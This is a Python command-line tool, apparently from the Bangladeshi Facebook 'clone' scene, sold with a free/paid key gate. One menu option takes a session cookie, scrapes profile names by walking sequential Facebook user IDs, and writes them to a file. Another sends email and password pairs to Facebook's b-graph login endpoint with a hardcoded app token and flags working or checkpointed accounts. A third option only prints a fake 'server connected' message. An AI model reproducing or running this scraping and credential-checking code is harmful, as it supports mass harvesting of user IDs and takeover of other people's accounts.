import os
import time
import requests
import uuid
from bs4 import BeautifulSoup

CONFIG_FILE = "user_config.txt"
saved_cookie = None
saved_time = 0.0
user_status = "free"

# ডাটা লোড করার সোজা লজিক
if os.path.exists(CONFIG_FILE):
    f = open(CONFIG_FILE, "r")
    lines = f.read().splitlines()
    f.close()
    if len(lines) >= 3:
        saved_cookie = lines[0]
        saved_time = float(lines[1])
        user_status = lines[2]

current_time = time.time()

# মেইন মেনু ডিসপ্লে
os.system('clear')
print("====================================")
print("    ★ MY Porn-Hub CONTROL ★        ")
print("        DEVELOPER: Devil_King       ")
print("====================================")
print("[#] User Status: " + str(user_status).upper())
print("====================================")
print("[1] (FB Method)")
print("[2] (Fb Friend list cheker)")
print("[3] (old clone)")
print("[4] (File clone)")
print("[5] (Random Clone)")
print("[6] (Exit)")
print("====================================")

choice = input("[★] 1/2/3/4/5/6 : ")

# -------------------------------------------------------------
# METHOD 1: FB UID COLLECTOR
# -------------------------------------------------------------
if choice in ["1", "১"]:
    fb_cookie = None
    if user_status == "paid":
        print("[+] Paid User Detected! Loading unlimited cookie...")
        fb_cookie = saved_cookie
    elif saved_cookie and (current_time - saved_time) < 7200:
        remaining_min = int((7200 - (current_time - saved_time)) / 60)
        print("[+] Active session found! (Expires in " + str(remaining_min) + " minutes)")
        fb_cookie = saved_cookie
    else:
        if saved_cookie:
            print("[!] Your 2-hour free session has expired!")
        fb_cookie = input("[+] Enter Your FB Cookie: ")
        print("\n[1] Continue as Free User (2 Hours Limit)")
        print("[2] Activate Paid Version (Unlimited)")
        user_choice = input("[+] Select option: ")
        if user_choice == "2":
            secret_key = input("[+] Enter Paid Activation Key: ")
            if secret_key == "ADMIN123":
                user_status = "paid"
                print("[+] Activation Successful! Unlimited Mode On.")
            else:
                print("[X] Invalid Key! Continuing as Free User.")
                user_status = "free"
        else:
            user_status = "free"
        f = open(CONFIG_FILE, "w")
        f.write(str(fb_cookie) + "\n" + str(time.time()) + "\n" + str(user_status) + "\n")
        f.close()

    if fb_cookie:
        series_start = int(input("\n[+] Select Series Start (e.g., 10001): "))
        series_end = int(input("[+] Select Series End (e.g., 10009): "))
        output_file = input("[+] Enter Output File Name (e.g., result.txt): ")
        session = requests.Session()
        headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36', 'Cookie': fb_cookie}
        print("\n[+] Connecting to server...")
        print("[+] Extracting data...\n")
        for uid_suffix in range(series_start, series_end + 1):
            full_uid = "1000271676" + str(uid_suffix)
            url = "https://mbasic.facebook.com/profile.php?id=" + str(full_uid)
            try:
                response = session.get(url, headers=headers)
                if response.status_code == 200:
                    soup = BeautifulSoup(response.text, 'html.parser')
                    page_title = soup.find('title')
                    if page_title:
                        profile_name = page_title.text.strip()
                    else:
                        profile_name = "Unknown User"
                    if "Log In" in profile_name or "Error" in profile_name or "Content Not Found" in profile_name:
                        print("[INVALID] UID: " + str(full_uid) + " (Cookie Dead)")
                    elif "add_friend" in response.text or "Add Friend" in response.text or "নম্বর" in response.text or "বন্ধু" in response.text:
                        print("[SUCCESS] UID: " + str(full_uid) + " | Name: " + str(profile_name))
                        file_out = open(output_file, "a", encoding="utf-8")
                        file_out.write(str(full_uid) + " | " + str(profile_name) + "\n")
                        file_out.close()
                    else:
                        print("[SKIPPED] UID: " + str(full_uid) + " (Follower Account)")
                time.sleep(2)
            except:
                print("[ERROR] Connection failed for UID " + str(full_uid))
    else:
        print("[X] Cookie Error!")

# -------------------------------------------------------------
# METHOD 2: REEL SERVER CHECK
# -------------------------------------------------------------
if choice in ["2", "২"]:
    os.system('clear')
    print("--- [2] Sex video / Reel Server Check ---")
    site = input("Enter Site Name: ")
    url = "https://www.facebook.com/reel/846400658"
    print("\n[+] Connecting to server via " + str(site) + "...")
    time.sleep(1.5)
    print("\n=======================================")
    print("Target URL: " + str(url))
    print("[✓] STATUS : SERVER CONNECTED SUCCESS")
    print("=======================================")

# -------------------------------------------------------------
# METHOD 3 & 4: EXPIRED OPTIONS
# -------------------------------------------------------------
if choice in ["3", "4", "৩", "৪", "8", "৮"]:
    os.system('clear')
    print("--- Option [" + str(choice) + "] ---")
    print("[X] ERROR: Method Not Found / Expired!")

# -------------------------------------------------------------
# METHOD 5: RANDOM CLONE (B-GRAPH)
# -------------------------------------------------------------
if choice in ["5", "৫"]:
    os.system('clear')
    print("--- [5] Random Clone (b-graph Method) ---")
    uid = input("[+] Enter UID/Email: ")
    password = input("[+] Enter Password: ")
    print("\n[+] Checking account details...")
    r = requests.Session()
    head = {'Host': 'b-graph.facebook.com', 'X-Fb-Connection-Type': 'WIFI', 'Authorization': 'OAuth 350685531728|62f8ce9f74744849a044318023157f12', 'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 10; Redmi Note 8 Pro Build/QP1A.190711.020)'}
    data = {'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()), 'email': uid, 'password': password, 'generate_analytics_claim': '1', 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_ext_attrib': '0', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'meta_inf_fbmeta': ''}
    try:
        pos = r.post('https://b-graph.facebook.com/auth/login', headers=head, data=data).json()
        if 'session_key' in pos or 'access_token' in pos:
            print("\n[Devil-OK] " + str(uid) + " | " + str(password))
        elif 'www.facebook.com' in str(pos):
            print("\n[Devil-CP] " + str(uid) + " | " + str(password))
        else:
            print("\n[X] Login Failed / Incorrect Details")
    except:
        print("\n[X] Network Error!")

# -------------------------------------------------------------
# METHOD 6: EXIT
# -------------------------------------------------------------
if choice in ["6", "৬"]:
    print("\n[+] Thank you for using this tool! Goodbye.")
    exit()

input("\nPress Enter to Exit...")
